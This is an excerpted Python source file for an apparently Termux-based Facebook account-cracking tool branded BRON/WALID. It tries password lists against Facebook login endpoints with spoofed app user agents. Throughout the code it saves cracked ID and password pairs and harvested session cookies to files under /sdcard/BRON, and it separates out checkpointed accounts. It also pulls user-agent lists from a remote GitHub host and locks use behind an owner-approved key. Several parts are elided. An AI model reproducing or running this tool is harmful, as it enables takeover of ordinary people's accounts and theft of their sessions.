...
android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/Walidsebti/data/main/Moifaka.txt').text.splitlines()
    for line in xx:
...
usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/Walidsebti/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
logo=(f"""\033[1;37m d8888b. d8888b.  .d88b.  d8b   db 
 88  `8D 88  `8D .8P  Y8. 888o  88 
 88oooY' 88oobY' 88    88 88V8o 88 
 88~~~b. 88`8b   88    88 88 V8o88 
 88   8D 88 `88. `8b  d8' 88  V888 
 Y8888P' 88   YD  `Y88P'  VP   V8P 
 ...
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mAuthor  : WALIDSABTI
 ...
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mCloning ids Saved in BRON folder
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
def linex():
    print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
os.system('xdg-open https://www.facebook.com/profile.php?id=100094453810993')
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [WALID-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [BRON-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/BRON/SEBTI-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [BRON-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/BRON/SEBTI-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/BRON/SEBTI-CP.txt','a').write(ids+'|'+pas+'\n')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/BRON/BRON-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BRON/WALID-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [WALID-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BRON/BRON-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/BRON/BRON-CP.txt','a').write(ids+'|'+pas+'\n')
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [BRON-OK] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [BRON-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/BRON/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BRON/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [BRON-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BRON/WALID-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def random_ua():
    ...
    ua1 = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') Safari/604.1'
    ua2 = "Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;] "+str(random.randrange(4,6))+" X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/"+str(random.randint(4,13))+".1.1 Mobile/"+model+" Safari/604.1"
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    ua3 = f"Dalvik/9.1.0 (Linux; U; Android 9.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/99.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]"+dv_typ+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [BRON-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/BRON/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/.BORON.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/.BRON.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python WALID.py')
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20SABTI%20Owner%20OWALID-XB%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://www.facebook.com/profile.php?id=100094453810993?text='+tks)
        main_apv() 
main_apv()